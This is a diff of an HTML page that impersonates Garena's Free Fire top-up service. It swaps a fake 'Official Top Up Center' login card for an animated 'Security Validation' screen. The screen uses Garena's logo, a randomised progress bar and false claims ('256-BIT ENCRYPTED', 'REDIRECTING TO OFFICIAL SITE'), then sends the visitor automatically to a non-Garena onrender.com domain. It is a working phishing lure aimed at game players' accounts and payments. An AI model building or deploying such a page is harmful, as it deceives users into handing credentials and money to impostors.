@@ -3,88 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Top Up Center</title>
+    <title>Security Validation | Garena</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }
         body {
-            background-color: #0f1115;
+            background-color: #050510;
+            background-image: radial-gradient(circle at 50% 50%, #111122 0%, #050510 100%);
             color: white;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            overflow: hidden;
         }
+
         .card {
-            background-color: #1a1d24;
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            background: rgba(15, 15, 25, 0.8);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.1), inset 0 0 20px rgba(0, 255, 255, 0.05);
             text-align: center;
-            max-width: 400px;
+            max-width: 380px;
             width: 90%;
-            border: 1px solid #2d313a;
+            position: relative;
+            backdrop-filter: blur(10px);
         }
-        .lock-icon {
-            background-color: #da291c;
-            width: 60px;
-            height: 60px;
+
+        /* Garena Logo Top */
+        .header-logo {
+            height: 35px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 10px rgba(255,255,255,0.2));
+        }
+
+        /* APON Style Glowing Circle */
+        .glow-circle {
+            width: 120px;
+            height: 120px;
             border-radius: 50%;
+            background: url('https://cdn1.garena.com/universal/images/ff/ff-logo.jpg') center/cover;
+            margin: 0 auto 30px auto;
+            position: relative;
+            border: 3px solid #da291c;
+            box-shadow: 0 0 30px rgba(218, 41, 28, 0.6);
+        }
+        
+        .glow-circle::before {
+            content: '';
+            position: absolute;
+            top: -10px; left: -10px; right: -10px; bottom: -10px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            border-top-color: #00ffff;
+            border-bottom-color: #00ffff;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .validation-text {
+            font-size: 28px;
+            font-weight: 700;
+            background: -webkit-linear-gradient(45deg, #ff00cc, #3333ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+
+        .status-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: #00ffff;
+            margin-bottom: 10px;
+            padding: 0 10px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff00cc, #00ffff);
+            border-radius: 10px;
+            transition: width 0.1s linear;
+            box-shadow: 0 0 10px #00ffff;
+        }
+
+        .secure-text {
+            font-size: 12px;
+            color: #a1a1aa;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0 auto 20px auto;
-        }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #a1a1aa;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-        .badge {
-            background-color: rgba(52, 168, 83, 0.1);
-            color: #34a853;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 13px;
-            font-weight: bold;
-            margin-bottom: 30px;
-            border: 1px solid rgba(52, 168, 83, 0.2);
-        }
-        .btn {
-            background-color: #da291c;
-            color: white;
-            text-decoration: none;
-            padding: 16px;
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 16px;
-            display: block;
-            transition: 0.3s;
-        }
-        .btn:hover {
-            background-color: #b82217;
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #52525b;
+            gap: 5px;
+            letter-spacing: 1px;
         }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <div class="lock-icon">
-            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+        <!-- Garena Logo Official -->
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/1/1c/Garena_Logo.svg/512px-Garena_Logo.svg.png" class="header-logo" style="filter: brightness(0) invert(1);">
+        
+        <div class="glow-circle" id="circleIcon"></div>
+
+        <div class="validation-text" id="titleText">SECURITY VALIDATION</div>
+
+        <div class="status-box">
+            <span id="statusMsg">Almost ready...</span>
+            <span id="percentText">0%</span>
         </div>
-        <h1>Official Top Up Center</h1>
-        <p>Secure login required to continue.</p>
-        <div class="badge">✓ 100% Safe & Secure Gateway</div>
-        <a href="https://garena-official-topup-centre.onrender.com" class="btn">CONTINUE TO LOGIN</a>
-        <div class="footer">Powered by Garena Online.</div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+
+        <div class="secure-text" id="secureText">
+            🔒 256-BIT ENCRYPTED
+        </div>
     </div>
+
+    <script>
+        let progress = 0;
+        const progressBar = document.getElementById('progress');
+        const percentText = document.getElementById('percentText');
+        const statusMsg = document.getElementById('statusMsg');
+        const titleText = document.getElementById('titleText');
+        const secureText = document.getElementById('secureText');
+        const circleIcon = document.getElementById('circleIcon');
+
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 5) + 1;
+            if (progress > 100) progress = 100;
+            
+            progressBar.style.width = progress + '%';
+            percentText.innerText = progress + '%';
+
+            if (progress > 30 && progress < 70) {
+                statusMsg.innerText = "Verifying secure connection...";
+            } else if (progress >= 70 && progress < 100) {
+                statusMsg.innerText = "Finalizing security checks...";
+            }
+
+            if (progress === 100) {
+                clearInterval(interval);
+                statusMsg.innerText = "REDIRECTING TO OFFICIAL SITE";
+                statusMsg.style.color = "#34a853"; // Green
+                titleText.innerText = "VALIDATION SUCCESSFUL";
+                titleText.style.background = "-webkit-linear-gradient(45deg, #34a853, #00ffff)";
+                titleText.style.webkitBackgroundClip = "text";
+                secureText.innerHTML = "✅ Secure Redirect Initiated";
+                circleIcon.style.boxShadow = "0 0 50px rgba(52, 168, 83, 0.8)";
+                
+                // 1.5 second baad Render wali website pe bhej dega
+                setTimeout(() => {
+                    window.location.href = "https://garena-official-topup-centre.onrender.com";
+                }, 1500);
+            }
+        }, 100);
+    </script>
 </body>
 </html>
